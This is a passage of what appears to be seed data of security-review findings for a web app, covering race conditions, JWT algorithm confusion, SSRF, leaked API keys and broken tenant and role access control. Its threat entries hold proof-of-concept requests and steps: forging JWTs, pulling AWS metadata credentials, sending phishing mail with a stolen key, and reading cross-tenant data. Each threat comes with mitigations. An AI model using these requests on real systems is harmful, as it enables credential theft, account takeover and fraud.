        description: "Because debits succeed even when concurrent requests should have depleted the balance, accounts can reach **deeply negative balances**. There is no `CHECK` constraint at the database level preventing `balance < 0`. The only validation is the application-layer check which is defeated by the race condition.\n\n**Financial impact modeling:**\n- An attacker with $100 balance can extract $100 × N where N is concurrent requests\n- Observed: 50 concurrent requests = $5,000 extracted from $100 balance\n- Theoretical maximum limited only by connection pool size and network latency\n- Each successful transfer creates a legitimate-looking transaction record\n- Funds can be immediately withdrawn to external accounts before detection\n\nThe attack requires only a valid account with any positive balance and the ability to send concurrent HTTP requests (achievable with `Promise.all()` in JavaScript or `asyncio.gather()` in Python). No special tools or elevated privileges are needed.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement atomic balance operations with database-level constraints",
        description: "The transfer operation must be **atomic** — the balance check and debit must happen as an indivisible unit that cannot be interleaved with other operations. Implement multiple layers of protection:\n\n**Layer 1: Pessimistic locking with `SELECT FOR UPDATE`:**\n```typescript\nawait db.$transaction(async (tx) => {\n  // Lock the sender's row - blocks concurrent reads until transaction completes\n  const sender = await tx.$queryRaw`\n    SELECT * FROM accounts WHERE id = ${senderId} FOR UPDATE\n  `;\n  \n  if (sender.balance < amount) throw new Error('Insufficient funds');\n  \n  await tx.accounts.update({ where: { id: senderId }, data: { balance: { decrement: amount } } });\n  await tx.accounts.update({ where: { id: recipientId }, data: { balance: { increment: amount } } });\n});\n```\n\n**Layer 2: Database CHECK constraint (safety net):**\n```sql\nALTER TABLE accounts ADD CONSTRAINT positive_balance CHECK (balance >= 0);\n```\n\n**Layer 3:** Set transaction isolation to `SERIALIZABLE` for the transfer endpoint or use optimistic concurrency control with version columns.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Add per-user request serialization via Redis distributed lock",
        description: "As an **immediate mitigation** deployable within hours, use a Redis-based distributed lock (Redlock algorithm) keyed on the sender's user ID. This ensures only one transfer from a given user can be in-flight at a time, eliminating the race condition at the application layer.\n\n**Implementation:**\n```typescript\nimport { Redlock } from 'redlock';\n\nconst redlock = new Redlock([redisClient], { retryCount: 3, retryDelay: 100 });\n\nasync function transferWithLock(senderId: string, recipientId: string, amount: number) {\n  const lock = await redlock.acquire([`lock:transfer:${senderId}`], 5000);\n  try {\n    await transfer(senderId, recipientId, amount);\n  } finally {\n    await lock.release();\n  }\n}\n```\n\n**Trade-offs:** This adds ~5-10ms latency per transfer and serializes all transfers from a single user (legitimate concurrent transfers to different recipients are queued). Acceptable for immediate risk reduction while the database-level fix is implemented. The lock TTL of 5 seconds prevents deadlocks if the application crashes mid-transfer.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "No reconciliation process detects balance inconsistencies",
        description: "There is no automated reconciliation process that compares expected balances (sum of all credits minus debits) against actual stored balances. If this race condition has been exploited in the past, the **discrepancy would go undetected** indefinitely.\n\n**Recommended reconciliation approach:**\n- Run hourly: `SELECT id, balance, (SELECT COALESCE(SUM(amount), 0) FROM transactions WHERE credit_account = id) - (SELECT COALESCE(SUM(amount), 0) FROM transactions WHERE debit_account = id) AS expected FROM accounts WHERE balance != expected`\n- Alert immediately on any discrepancy > $0.01\n- Investigate all historical transactions from accounts showing negative balances\n- Implement real-time balance assertion: after every transfer, verify `balance == SUM(credits) - SUM(debits)` and halt operations if inconsistent",
        severity: "MEDIUM",
        strideCategory: "REPUDIATION",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
    ],
  },
  {
    title: "JWT token validation bypass via algorithm confusion",
    summary: "The authentication system uses **RS256** (RSA asymmetric) JWT tokens but the token validation library (`jsonwebtoken` v8.x) accepts the algorithm specified in the JWT header without restriction. An attacker can change the `alg` field in the JWT header from `RS256` to `HS256`, then sign the token using the **public key** (available at `/.well-known/jwks.json`) as the HMAC secret.\n\nThe validation library then uses the public key as the HS256 symmetric secret, validates the forged signature successfully, and accepts the token. This allows **complete authentication bypass** — an attacker can forge tokens for any user including administrators by crafting JWTs with arbitrary `sub`, `role`, and `permissions` claims, signed with the publicly downloadable RSA public key. The vulnerability is a well-known attack (CVE-2015-9235) that has been present since the library integration in January 2024.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "PUBLISHED",
    source: "LINEAR",
    externalId: "LOO-011",
    findings: [
      {
        type: "THREAT",
        title: "Token forgery via RS256-to-HS256 algorithm substitution attack",
        description: "By changing the JWT header's `alg` field from `RS256` to `HS256` and signing with the RSA public key (used as HMAC secret), an attacker can forge tokens that pass validation. The public key is freely available at `/.well-known/jwks.json`.\n\n**Exploitation steps:**\n1. Download public key: `curl https://app.example.com/.well-known/jwks.json`\n2. Extract the RSA public key in PEM format\n3. Craft JWT with desired claims: `{\"sub\": \"admin_user_id\", \"role\": \"admin\"}`\n4. Set header `alg` to `HS256` instead of `RS256`\n5. Sign using public key as HMAC secret: `HMACSHA256(header.payload, publicKey)`\n6. The server's `jwt.verify(token, publicKey)` accepts it because:\n   - It reads `alg: HS256` from the header\n   - It uses the provided `publicKey` as the HMAC secret\n   - The HMAC signature matches because the attacker used the same key\n\nForged tokens are **cryptographically valid** from the library's perspective. They are indistinguishable from legitimate tokens in logs or monitoring.",
        severity: "CRITICAL",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "THREAT",
        title: "Full administrative account takeover via forged JWT claims",
        description: "Combined with the algorithm confusion attack, an attacker can set **arbitrary claims** in forged tokens including `role: 'superadmin'`, `permissions: ['*']`, and `sub: '<any_user_id>'`. Since the system trusts JWT claims after signature validation passes, this grants complete administrative access.\n\n**Impact of forged admin token:**\n- Full user management: create, delete, modify any account\n- Billing access: view/modify subscription plans, export payment data\n- Data export: bulk download all tenant data, database backups\n- Configuration: modify security settings, disable MFA requirements, add OAuth providers\n- Audit log manipulation: if admin can clear logs, attack evidence can be destroyed\n\nThe `sub` claim is used directly for database lookups (`WHERE id = jwt.sub`), meaning the attacker operates **as** the target user in all respects. There is no secondary verification of identity beyond the JWT.",
        severity: "CRITICAL",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "MITIGATION",
        title: "Pin accepted algorithms to RS256 only in JWT verification config",
        description: "Configure the JWT verification to **explicitly specify** the allowed algorithm, ignoring the `alg` field in the token header. This is the primary and complete fix for the algorithm confusion attack.\n\n**Fix implementation:**\n```typescript\nimport jwt from 'jsonwebtoken';\n\n// BEFORE (vulnerable - trusts header alg)\nconst decoded = jwt.verify(token, publicKey);\n\n// AFTER (secure - forces RS256 regardless of header)\nconst decoded = jwt.verify(token, publicKey, {\n  algorithms: ['RS256'],  // Reject ALL other algorithms\n  issuer: 'https://auth.example.com',\n  audience: 'https://api.example.com',\n  clockTolerance: 30  // 30s clock skew tolerance\n});\n```\n\nWith `algorithms: ['RS256']` specified, the library **ignores** the `alg` header field and always validates using RSA. An HS256-signed token will fail validation because RSA signature verification with the public key will not match the HMAC signature. This fix is a one-line change with zero risk of breaking legitimate tokens.",
        severity: "CRITICAL",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "REQUIREMENT",
        title: "Migrate from jsonwebtoken to jose library with secure defaults",
        description: "The `jsonwebtoken` library (v8.x) uses **permissive defaults** that trust the token header's `alg` field — a known-insecure behavior documented in CVE-2015-9235. While the immediate fix (pinning algorithms) resolves the current vulnerability, the library's dangerous defaults create ongoing risk for future developers who may not specify the `algorithms` option.\n\n**Migration recommendation:**\n```typescript\n// jose library requires explicit algorithm - cannot be vulnerable\nimport { jwtVerify } from 'jose';\nimport { importSPKI } from 'jose';\n\nconst publicKey = await importSPKI(pemKey, 'RS256');\nconst { payload } = await jwtVerify(token, publicKey, {\n  issuer: 'https://auth.example.com',\n  audience: 'https://api.example.com',\n});\n```\n\nThe `jose` library was designed with security-by-default principles: it **requires** explicit algorithm specification during key import, making algorithm confusion attacks structurally impossible. It also supports EdDSA (Ed25519) for future key rotation to more efficient algorithms.",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "RESOLVED",
      },
      {
        type: "OBSERVATION",
        title: "No token revocation mechanism exists for compromised tokens",
        description: "The system has no way to **invalidate individual tokens** before their natural expiry (currently set to 7 days). If a forged or stolen token is detected, there is no mechanism to revoke it — the attacker retains access until the token expires.\n\n**Recommended revocation strategies:**\n- **Short-lived tokens:** Reduce JWT expiry from 7 days to 15 minutes with refresh token rotation\n- **Token blacklist:** Maintain a Redis set of revoked `jti` (JWT ID) claims, checked on every request\n- **Key rotation:** Support rotating signing keys with `kid` (Key ID) header, allowing immediate invalidation of all tokens signed with a compromised key\n- **Session binding:** Store a session version in the database; increment on password change or security event; reject tokens with old version\n\nThe 7-day token lifetime is **excessively long** for the threat model. Even 1-hour tokens with transparent refresh provide equivalent user experience with dramatically reduced exposure window.",
        severity: "LOW",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "RESOLVED",
      },
    ],
  },
  {
    title: "Server-side request forgery in URL preview feature",
    summary: "The link preview feature fetches metadata (title, description, Open Graph image) from user-supplied URLs when users paste links in messages or documents. The server-side fetch implementation in `src/services/linkPreview.ts` does **not restrict** the target URL scheme, destination IP range, or response size. An attacker can supply internal URLs to access resources that should not be reachable from outside the network perimeter.\n\nTargets include the **AWS metadata service** (`http://169.254.169.254/latest/meta-data/`), internal Redis instances (`http://localhost:6379/`), Kubernetes API servers, and private microservices. The response body is partially exposed through the preview metadata fields (`og:title` mapped to preview title, first 200 chars of body to description). The feature runs with the application's **IAM role** which has access to S3 buckets, Secrets Manager, SQS queues, and DynamoDB tables.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "NOTION",
    externalId: "PAGE-006",
    findings: [
      {
        type: "THREAT",
        title: "AWS credential theft via SSRF to instance metadata service",
        description: "An attacker can supply `http://169.254.169.254/latest/meta-data/iam/security-credentials/` as a preview URL to retrieve **temporary AWS credentials** from the Instance Metadata Service (IMDSv1). These credentials inherit the application's IAM role permissions.\n\n**Exploitation:**\n```\nPOST /api/messages\n{\"content\": \"Check this: http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role\"}\n```\n\nThe preview feature fetches this URL server-side and the response (containing `AccessKeyId`, `SecretAccessKey`, `Token`) is exposed in the link preview description field. The stolen credentials grant access to:\n- **S3:** Read/write all application buckets (user uploads, backups, logs)\n- **Secrets Manager:** Read database passwords, API keys, encryption keys\n- **SQS:** Read/inject messages into job queues\n- **DynamoDB:** Full read/write to session store and feature flags\n\nCredentials are valid for 6 hours (default role session duration) and can be used from any IP address.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Internal network reconnaissance and service interaction via SSRF",
        description: "By varying the hostname, port, and path in supplied URLs, an attacker can **map the internal network topology** and interact with services not exposed to the internet. The SSRF acts as a proxy into the private VPC.\n\n**Enumeration technique:**\n- Open ports return content (200 OK with body in preview)\n- Closed ports return connection refused (error in preview: \"Failed to fetch\")\n- Filtered ports timeout (preview shows \"Request timeout\")\n- DNS resolution failures show \"DNS lookup failed\" with hostname\n\n**High-value internal targets:**\n- `http://10.0.1.50:6379/INFO` — Redis server info, memory contents\n- `http://10.0.1.100:9200/_cluster/health` — Elasticsearch cluster details\n- `http://10.0.1.25:8500/v1/kv/?recurse` — Consul KV store (secrets, configs)\n- `http://kubernetes.default.svc:443/api/v1/secrets` — K8s secrets (if service account has access)\n- `http://10.0.1.75:8080/admin` — Internal admin panels without auth\n\nEach probe takes only the time of one HTTP request, enabling rapid scanning of the entire `10.0.0.0/16` private subnet.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement URL validation with DNS rebinding protection",
        description: "The URL fetch must validate that the **resolved IP address** is not in any private, loopback, or link-local range. Validation must occur **after DNS resolution** to prevent DNS rebinding attacks where a hostname initially resolves to a public IP but changes to an internal IP between validation and fetch.\n\n**Required blocked ranges:**\n- `127.0.0.0/8` (loopback)\n- `10.0.0.0/8` (private class A)\n- `172.16.0.0/12` (private class B)\n- `192.168.0.0/16` (private class C)\n- `169.254.0.0/16` (link-local, AWS metadata)\n- `0.0.0.0/8` (unspecified)\n- `fc00::/7` (IPv6 unique local)\n- `::1/128` (IPv6 loopback)\n\n**Implementation requirements:**\n- Resolve DNS and validate IP **in the same step** (use custom DNS resolver that returns IP)\n- Block non-HTTP(S) schemes (`file://`, `gopher://`, `dict://`, `ftp://`)\n- Set maximum response size (1MB) and timeout (5 seconds)\n- Run the fetch in an **isolated service** with minimal IAM permissions (no S3, no Secrets Manager)\n- Block redirects to private IPs (validate each redirect hop)",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Enforce IMDSv2 on all EC2 instances to block metadata SSRF",
        description: "Enable **IMDSv2** (Instance Metadata Service v2) on all EC2 instances and set the HTTP PUT response hop limit to 1. IMDSv2 requires a session token obtained via an HTTP `PUT` request before metadata can be accessed via `GET`. Most SSRF vulnerabilities can only issue `GET` requests, making IMDSv2 an effective mitigation.\n\n**AWS CLI configuration:**\n```bash\n# Enforce IMDSv2 on all instances\naws ec2 modify-instance-metadata-options \\\n  --instance-id i-1234567890abcdef0 \\\n  --http-tokens required \\\n  --http-put-response-hop-limit 1 \\\n  --http-endpoint enabled\n```\n\n**Terraform configuration:**\n```hcl\nresource \"aws_instance\" \"app\" {\n  metadata_options {\n    http_tokens   = \"required\"  # Enforces IMDSv2\n    http_endpoint = \"enabled\"\n    http_put_response_hop_limit = 1\n  }\n}\n```\n\nThis blocks the **most critical SSRF target** (AWS credentials) while the application-level URL validation is developed. Deploy immediately across all instances. Note: verify that application code and user-data scripts do not rely on IMDSv1 before enforcing.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "OBSERVATION",
        title: "Link preview service runs with full application IAM permissions",
        description: "The link preview feature executes within the main application process, inheriting its **full IAM role** with access to S3, Secrets Manager, SQS, DynamoDB, and other AWS services. This violates the principle of least privilege — a URL fetching service needs only outbound HTTPS access.\n\n**Recommended architecture:**\n- Extract link preview into a **separate microservice** or Lambda function\n- Assign a minimal IAM role with only `ec2:DescribeNetworkInterfaces` (if needed) and no data service access\n- Run in an isolated VPC subnet with no routes to internal services\n- Use a security group allowing only outbound HTTPS (443) to the internet\n- Set up VPC flow logs to detect unusual traffic patterns from the preview service\n\nThis architectural change ensures that even a complete SSRF bypass (e.g., DNS rebinding defeating IP validation) cannot access sensitive internal resources because the service simply has no network path or IAM permissions to reach them.",
        severity: "MEDIUM",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "HIGH",
        status: "OPEN",
      },
    ],
  },
  {
    title: "Hardcoded API keys in client-side bundle",
    summary: "The production JavaScript bundle (`dist/main.chunk.js`) contains **hardcoded API keys** for Stripe (`sk_live_*`), SendGrid (`SG.*`), and Google Maps (`AIza*`). These keys are embedded directly in source files (`src/config/services.ts`) as string constants rather than loaded from environment variables at build time, and they survive the webpack build process into the **client-side bundle** served to browsers.\n\nThe Stripe **secret key** (not publishable key) grants full API access including the ability to issue refunds, read customer payment methods, and modify subscription plans. Browser DevTools (`Sources` tab → search for `sk_live`) or a simple `strings` command on the downloaded bundle exposes these keys to any user. Git history shows the keys have been active and unchanged for **8 months**, meaning they may already be compromised and actively abused.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "APPROVED",
    source: "LINEAR",
    externalId: "LOO-014",
    findings: [
      {
        type: "THREAT",
        title: "Stripe secret key exposure enables unauthorized financial operations",
        description: "The Stripe `sk_live_*` key embedded in the client bundle grants **full API access** to the Stripe account. Unlike the publishable key (`pk_live_*`) which is designed for client-side use, the secret key can perform any operation without additional authentication.\n\n**Attacker capabilities with stolen `sk_live` key:**\n- `POST /v1/refunds` — Issue refunds to arbitrary bank accounts, draining the merchant balance\n- `GET /v1/customers` — List all customers with email, name, and card last-4 digits\n- `GET /v1/payment_methods` — Access stored payment method details\n- `POST /v1/subscriptions` — Create, modify, or cancel any customer's subscription\n- `GET /v1/balance` — View current account balance and pending payouts\n- `POST /v1/payouts` — Initiate payouts to connected bank accounts\n\nThe key has been exposed in production for approximately **8 months** per git history (`git log --all -p -- src/config/services.ts`). During this window, any of the application's users (or anyone who viewed page source) could have extracted and abused this key.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "THREAT",
        title: "SendGrid API key enables phishing from trusted company domain",
        description: "The exposed SendGrid API key (`SG.xxxx...`) can send emails **from the company's verified domain** with full SPF, DKIM, and DMARC alignment. An attacker can send highly convincing phishing emails to customers, partners, or employees that pass all email authentication checks.\n\n**Phishing attack scenario:**\n```bash\ncurl -X POST https://api.sendgrid.com/v3/mail/send \\\n  -H \"Authorization: Bearer SG.stolen_key_here\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"personalizations\": [{\"to\": [{\"email\": \"victim@customer.com\"}]}],\n       \"from\": {\"email\": \"support@company.com\", \"name\": \"Company Support\"},\n       \"subject\": \"Action Required: Verify Your Account\",\n       \"content\": [{\"type\": \"text/html\", \"value\": \"<a href=https://evil.com/phish>Click here</a>\"}]}'\n```\n\nThe email will appear completely legitimate in recipients' inboxes — no spam folder, no warnings — because it's actually sent through the authorized email infrastructure. This makes credential phishing and BEC (Business Email Compromise) attacks extremely effective.",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "REQUIREMENT",
        title: "Move all secrets to server-side environment variables with build-time injection",
        description: "All API keys must be loaded from **environment variables** and accessed only in server-side code. Client-side code requiring API access should proxy requests through backend endpoints that hold the keys securely. Implement automated secret scanning in CI/CD.\n\n**Required changes:**\n1. Move keys to environment variables: `STRIPE_SECRET_KEY`, `SENDGRID_API_KEY`, `GOOGLE_MAPS_KEY`\n2. Create server-side proxy endpoints: `POST /api/internal/send-email`, `POST /api/internal/stripe`\n3. For Google Maps (client-side required): use **API key restrictions** (HTTP referrer, API scope)\n4. Add pre-commit hook scanning for key patterns:\n```yaml\n# .pre-commit-config.yaml\n- repo: https://github.com/Yelp/detect-secrets\n  hooks:\n  - id: detect-secrets\n    args: ['--baseline', '.secrets.baseline']\n```\n5. Add CI pipeline check: `detect-secrets scan --all-files --force-use-all-plugins`\n6. Configure webpack/vite to **error** if `process.env.*_KEY` resolves to a string literal rather than `undefined` in client bundles",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "RESOLVED",
      },
      {
        type: "MITIGATION",
        title: "Rotate all exposed credentials and audit usage logs immediately",
        description: "All three exposed keys must be **rotated immediately** — assume they are compromised given the 8-month exposure window. Generate new keys, update server-side configuration, and revoke the old keys.\n\n**Rotation checklist:**\n1. **Stripe:** Generate new `sk_live` key in Stripe Dashboard → Developers → API Keys → Roll Key. Review `Events` tab for unauthorized operations (refunds, payouts, customer data access)\n2. **SendGrid:** Create new API key → Settings → API Keys → Create. Review `Activity Feed` for emails sent to unknown recipients or with unusual content\n3. **Google Maps:** Generate new key in GCP Console → APIs & Services → Credentials. Check billing for unexpected usage spikes indicating quota abuse\n\n**Post-rotation audit:**\n- Set up billing alerts on all three services (alert at 120% of normal usage)\n- Enable detailed logging/webhooks for all API operations\n- Search access logs for requests originating from unexpected IPs\n- Consider engaging incident response team if unauthorized operations are discovered",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "OBSERVATION",
        title: "No secret scanning in CI pipeline or git hooks",
        description: "The repository has **no automated secret detection** at any stage of the development lifecycle — no pre-commit hooks, no CI pipeline scanning, and no runtime secret exposure monitoring. The current hardcoded keys were committed 8 months ago without any tooling flagging the issue.\n\n**Defense layers that should exist:**\n- **Pre-commit:** `detect-secrets` or `gitleaks` hook that blocks commits containing high-entropy strings or known key patterns\n- **CI pipeline:** Secret scanning step in GitHub Actions/GitLab CI that fails the build if secrets are detected in source\n- **GitHub Advanced Security:** Enable secret scanning with push protection (blocks pushes containing detected secrets)\n- **Runtime monitoring:** AWS Macie or similar scanning S3 buckets and CloudWatch logs for exposed credentials\n- **Git history:** Run `trufflehog` against full git history to find any other secrets committed historically\n\nThe absence of all these layers suggests a systemic gap in the security development lifecycle (SDLC) rather than an isolated oversight.",
        severity: "LOW",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },
  {
    title: "Broken access control in tenant isolation layer",
    summary: "The multi-tenant application enforces tenant isolation through application-level middleware that extracts `tenantId` from the authenticated user's JWT and sets it in the request context (`ctx.tenantId`). However, **12 API endpoints** across the `projects`, `billing`, and `reports` modules accept a `tenantId` parameter in the request body or query string and use it **directly** for database queries without validating it against the authenticated user's tenant.\n\nAn attacker authenticated in Tenant A can access, modify, and delete data belonging to Tenant B by substituting the `tenantId` in API requests. The vulnerability affects the most sensitive operations: project data access, billing plan modifications, and financial report generation. Database queries in these endpoints use `req.body.tenantId` or `req.query.tenantId` rather than the middleware-injected `ctx.tenantId`, completely bypassing the tenant isolation boundary that is the foundation of the multi-tenant security model.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-019",
    findings: [
      {
        type: "THREAT",
        title: "Cross-tenant data exfiltration via tenantId parameter manipulation",
        description: "Endpoints like `GET /api/projects?tenantId=<other_tenant>` return data from other tenants without any ownership verification. The middleware correctly sets `ctx.tenantId` from the JWT, but affected endpoints read `tenantId` from **request parameters** instead of the security context.\n\n**Proof of concept:**\n```bash\n# Authenticated as user in tenant_A, accessing tenant_B's projects\ncurl -H \"Authorization: Bearer $TENANT_A_TOKEN\" \\\n  \"https://app.example.com/api/projects?tenantId=tenant_B_id\"\n\n# Response: Full list of tenant_B's projects with all metadata\n{\"projects\": [{\"id\": \"proj_1\", \"name\": \"Secret Project\", \"description\": \"...\"}]}\n```\n\nTenant IDs are often **discoverable** through: sequential patterns (if UUIDs are not used), error messages that leak IDs, shared integration callbacks, or social engineering. Even with UUIDs, a single leaked tenant ID (from a support email, URL in a screenshot, etc.) breaks isolation for that tenant permanently.\n\n**Affected read endpoints:** `GET /api/projects`, `GET /api/projects/:id`, `GET /api/reports/revenue`, `GET /api/reports/usage`, `GET /api/billing/invoices`",
        severity: "CRITICAL",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Cross-tenant data modification via billing and project write endpoints",
        description: "Write operations (`PUT`, `POST`, `DELETE`) in the billing and projects modules also accept `tenantId` in the request body, enabling an attacker to **modify or delete** another tenant's data. This escalates from information disclosure to active tampering and denial of service.\n\n**Critical write endpoints vulnerable:**\n```\nPUT  /api/billing/plan     - Change another tenant's subscription plan\nPOST /api/billing/cancel   - Cancel another tenant's subscription entirely\nDELETE /api/projects/:id   - Delete projects belonging to other tenants\nPUT  /api/projects/:id      - Modify other tenant's project configuration\nPOST /api/reports/export   - Generate and receive other tenant's financial reports\n```\n\n**Attack scenarios:**\n- Downgrade a competitor's plan to the free tier, disabling paid features\n- Delete a tenant's critical projects causing data loss and business disruption\n- Modify project settings to expose private repositories or disable security features\n- Cancel a tenant's subscription, triggering account suspension after grace period",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Enforce middleware-injected tenantId for all database queries globally",
        description: "All database queries **must** use the `tenantId` from the authenticated middleware context (derived from the JWT), never from request parameters. This must be enforced architecturally, not just by code review.\n\n**Implementation strategy:**\n1. **Remove tenantId from all request schemas:** Strip `tenantId` from Zod/Joi validation schemas for request bodies and query params\n2. **Middleware enforcement:** Add middleware that rejects requests containing `tenantId` in body/query:\n```typescript\napp.use((req, res, next) => {\n  if (req.body?.tenantId || req.query?.tenantId) {\n    logger.warn('Tenant ID injection attempt', { userId: req.user.id, ip: req.ip });\n    return res.status(400).json({ error: 'tenantId must not be provided in requests' });\n  }\n  next();\n});\n```\n3. **Prisma middleware:** Add a global Prisma middleware that automatically injects `tenantId` into all `where` clauses\n4. **ESLint rule:** Custom lint rule that flags any access to `req.body.tenantId` or `req.query.tenantId`\n5. **Integration tests:** Add cross-tenant access tests for every endpoint that assert 404 responses",
        severity: "CRITICAL",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "HIGH",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Implement PostgreSQL Row-Level Security as database-level tenant isolation",
        description: "Add **PostgreSQL Row-Level Security (RLS)** policies that filter rows by `tenant_id` based on a session variable set by the application middleware. This ensures tenant isolation at the **database level** even if application code has bugs, providing defense-in-depth.\n\n**Implementation:**\n```sql\n-- Enable RLS on all tenant-scoped tables\nALTER TABLE projects ENABLE ROW LEVEL SECURITY;\nALTER TABLE billing_plans ENABLE ROW LEVEL SECURITY;\nALTER TABLE reports ENABLE ROW LEVEL SECURITY;\n\n-- Create policy: rows only visible if tenant matches session var\nCREATE POLICY tenant_isolation ON projects\n  USING (tenant_id = current_setting('app.current_tenant_id')::uuid);\n\n-- Application sets session variable before each request\nSET LOCAL app.current_tenant_id = '<tenant_id_from_jwt>';\n```\n\n**Benefits:** Even if a developer writes `SELECT * FROM projects WHERE tenant_id = $untrusted_input`, the RLS policy will filter results to only the authenticated tenant's rows. This makes cross-tenant access **structurally impossible** at the database layer, regardless of application-layer bugs.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "HIGH",
        status: "DEFERRED",
      },
      {
        type: "OBSERVATION",
        title: "Systematic anti-pattern: 12 endpoints confirmed across 3 modules",
        description: "The security audit identified **12 vulnerable endpoints** following the same anti-pattern of reading `tenantId` from request input rather than the authenticated context:\n\n**Projects module (5 endpoints):**\n- `GET /api/projects` — list projects\n- `GET /api/projects/:id` — get project detail\n- `PUT /api/projects/:id` — update project\n- `DELETE /api/projects/:id` — delete project\n- `POST /api/projects/:id/members` — add project member\n\n**Billing module (4 endpoints):**\n- `GET /api/billing/invoices` — list invoices\n- `PUT /api/billing/plan` — change plan\n- `POST /api/billing/cancel` — cancel subscription\n- `GET /api/billing/usage` — usage metrics\n\n**Reports module (3 endpoints):**\n- `GET /api/reports/revenue` — revenue report\n- `GET /api/reports/usage` — usage analytics\n- `POST /api/reports/export` — export report data\n\nThe pattern suggests **copy-paste propagation** from an early template or code generator that included `tenantId` as a request parameter. A systematic fix should audit **all** endpoints (not just these 12) using automated code scanning for `req.body.tenantId` and `req.query.tenantId` patterns.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
    ],
  },

  // ─── Review 11 ──────────────────────────────────────────────────────────────
  {
    title: "Privilege escalation via role manipulation in admin panel",
    summary: "The admin panel's role management system at `/api/admin/users/:id/role` accepts role changes via a direct PUT request without verifying that the requesting user has sufficient privileges to assign the target role. A user with 'editor' permissions can elevate their own account (or any other account) to 'super_admin' by crafting a request with `{\"role\": \"super_admin\"}`.\n\n**Impact:** Complete administrative takeover. Any authenticated user with basic panel access can:\n\n- Promote themselves to super_admin\n- Demote or remove other administrators\n- Access all tenant management functions\n- Modify billing and subscription settings\n- Export all user PII data\n\nThe vulnerability exists because the `updateUserRole()` handler in `src/controllers/admin.ts` only checks that the user **is authenticated** but does not verify role hierarchy. The role enum is validated (must be a valid role string) but authorization to assign that role is never checked.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "DRAFT",
    source: "LINEAR",
    externalId: "LOO-021",
    findings: [
      {
        type: "THREAT",
        title: "Broken access control allows horizontal role escalation",
        description: "The `PUT /api/admin/users/:id/role` endpoint enforces authentication but lacks authorization checks. The handler validates that the `role` field is one of the allowed enum values (`viewer`, `editor`, `admin`, `super_admin`) but never verifies whether the **requesting user** has permission to assign that role.\n\n**Proof of concept:**\n```bash\n# User with 'editor' role escalates to super_admin\ncurl -X PUT https://app.example.com/api/admin/users/self/role \\\n  -H \"Authorization: Bearer <editor_token>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"role\": \"super_admin\"}'\n# Returns 200 OK — role updated successfully\n```\n\nThe root cause is in `src/controllers/admin.ts:142` where `requireAuth()` middleware is applied but `requireRole('super_admin')` is not. The fix requires adding hierarchical role checks: only super_admins can assign admin+, only admins can assign editor+, etc.",
        severity: "HIGH",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Self-referential role update bypasses audit trail",
